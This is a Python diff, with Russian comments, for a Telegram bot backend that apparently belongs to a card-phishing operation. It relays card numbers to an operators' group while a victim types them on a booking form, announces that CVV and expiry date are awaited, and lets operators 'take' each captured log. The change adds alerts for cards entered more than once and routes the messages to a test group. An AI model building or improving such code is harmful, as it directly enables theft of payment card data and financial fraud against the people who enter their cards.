@@ -25,10 +25,6 @@ def register_endpoints(app: FastAPI, bot: Bot):
             # Создаем/обновляем лог
             create_or_update_log(session_id, masked_pan, booking_id, client_id, step)
             
-            # Проверяем дубликаты
-            duplicates = find_card_duplicates(masked_pan)
-            previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
-            
             if step == "card_number_only":
                 bin_number = masked_pan[:6]
                 card_info = await get_card_info(bin_number)
@@ -39,6 +35,16 @@ def register_endpoints(app: FastAPI, bot: Bot):
                 message_text = (
                     f"🆔 #{booking_id} || #{client_id}\n"
                     f"🎯 Пользователь ввел карту, приготовиться!\n\n"
+                )
+                
+                # Добавляем предупреждение о дубликате для card_number_only
+                duplicates = find_card_duplicates(masked_pan)
+                previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
+                
+                if previous_uses:
+                    message_text += f"⚠️ <b>Эта карта уже вводилась ранее</b>\n\n"
+                
+                message_text += (
                     f"💳 Номер карты:\n"
                     f"🔹 <code>{masked_pan}</code>\n"
                     f"🔹 <code>{card_with_spaces}</code>\n\n\n"
@@ -46,21 +52,32 @@ def register_endpoints(app: FastAPI, bot: Bot):
                     f"⏳ Ожидаем CVV и expiry date..."
                 )
                 
-                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML")
+                await bot.send_message(config.GROUP_ID_TEST, message_text, parse_mode="HTML")
                 
             else:
                 card_with_spaces = ' '.join([masked_pan[i:i+4] for i in range(0, len(masked_pan), 4)])
                 
+                # Проверяем дубликаты для основного уведомления
+                duplicates = find_card_duplicates(masked_pan)
+                previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
+                
                 message_text = (
                     f"🆔 #{booking_id} || #{client_id}\n"
                     f"🔔 Пользователь ожидает 🔔\n\n"
+                )
+                
+                # Добавляем предупреждение о дубликате, если карта использовалась ранее
+                if previous_uses:
+                    message_text += f"⚠️ <b>Эта карта уже вводилась ранее</b>\n\n"
+                
+                message_text += (
                     f"💳 Номер карты:\n\n"
                     f"🔹 <code>{masked_pan}</code>\n"
                     f"🔹 <code>{card_with_spaces}</code>\n\n"
                 )
                 
                 await bot.send_message(
-                    config.GROUP_ID, 
+                    config.GROUP_ID_TEST, 
                     message_text, 
                     parse_mode="HTML", 
                     reply_markup=get_take_log_keyboard(session_id)
@@ -127,10 +144,8 @@ def register_endpoints(app: FastAPI, bot: Bot):
             client_id = log['client_id']
 
             if log and log['taken_by']:
-                # Проверяем дубликаты ПЕРЕД сохранением новой карты
                 duplicates = find_card_duplicates(card_without_spaces)
-                # Теперь НЕ исключаем текущий session_id - показываем если карта вообще была в истории
-                previous_uses = duplicates if duplicates else []
+                previous_uses = [dup for dup in duplicates if dup['session_id'] != session_id]
                 
                 # Сохраняем новую карту в историю ПОСЛЕ проверки дубликатов
                 if card_without_spaces and len(card_without_spaces) >= 6:
